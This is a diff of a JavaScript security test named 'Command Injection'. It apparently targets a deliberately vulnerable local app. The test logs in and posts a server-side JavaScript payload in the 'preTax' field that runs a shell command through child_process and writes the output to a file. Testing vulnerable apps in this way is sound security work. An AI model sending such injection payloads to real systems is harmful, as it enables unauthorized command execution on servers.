@@ -7,53 +7,56 @@ const util = require('util');
 const fs = require('fs');
 const resemble = require('resemblejs');
 var chaiFiles = require('chai-files');
+var request = require('superagent');
 
 chai.use(chaiFiles);
 var file = chaiFiles.file;
 
 
 describe('Command Injection', function () {
+        var superagent = request.agent()
 
-        var pref = new logging.Preferences();
-        //  pref.setLevel('browser', logging.Level.ALL);
-        pref.setLevel('driver', logging.Level.ALL);
 
-        const capabilities = {
-            'goog:loggingPrefs': {
-                'browser': 'ALL'
-            }
-        }
+        before(() => {
+            return new Promise((resolve) => {
+                this.enableTimeouts(false)
 
-        const driver = new Builder().withCapabilities(capabilities).setLoggingPrefs(pref).forBrowser('chrome')
-            .build();
+                fs.writeFile('.hacked2', 'Hello content!', function (err) {
+                    if (err) throw err;
+                    console.log('Saved!');
 
-        before(async function () {
-            const r1 = await driver.get('localhost:4000/login');
-            await driver.findElement(By.name('userName')).sendKeys('user1');
-            await driver.findElement(By.name('password')).sendKeys('User1_123', Key.ENTER);
-        });
-        after(async () => {
-            //   requester.close();
-               driver.quit();
+                });
+
+                superagent
+                    .post('http://localhost:4000/login')
+                    .send({
+                        userName: 'user1',
+                        password: 'User1_123'
+                    })
+                    .then((err) => {
+                        console.log("logged in");
+                        resolve()
+                    });
+            })
+
         });
 
 
         it('Command', async () => {
 
-            await driver.findElement(By.id('contributions-menu-link')).click();
 
-            await driver.findElement(By.name("preTax")).clear();
-
-            await driver.findElement(By.name("preTax")).sendKeys(
-                ` var exec = require('child_process').exec;` +
-                `function execute(command, callback) {` +
-                `exec("dir", function (error, stdout, stderr) {` +
-                `const fs = require('fs');` +
-                `fs.writeFile("./logs.txt", stdout, function (err) {` +
-                `if (err) {return console.log(err);}` +
-                `console.log("The file was saved!");});})}` +
-                `execute("dir", '');`,
-                Key.ENTER);
+            await superagent
+                .post('http://localhost:4000/contributions')
+                .send(
+                    `preTax= var exec = require('child_process').exec;`
+                    + `function execute(command, callback) {`
+                    + `exec(\"dir\", function (error, stdout, stderr) {`
+                    + `const fs = require('fs');`
+                    + `fs.writeFile(\"./logs.txt\", stdout, function (err) {`
+                    + `if (err) {return console.log(err);}`
+                    + `console.log(\"The file was saved!\");});})}`
+                    + `execute(\"dir\", '');`
+                );
 
 
             expect(file('./logs.txt')).to.exist;
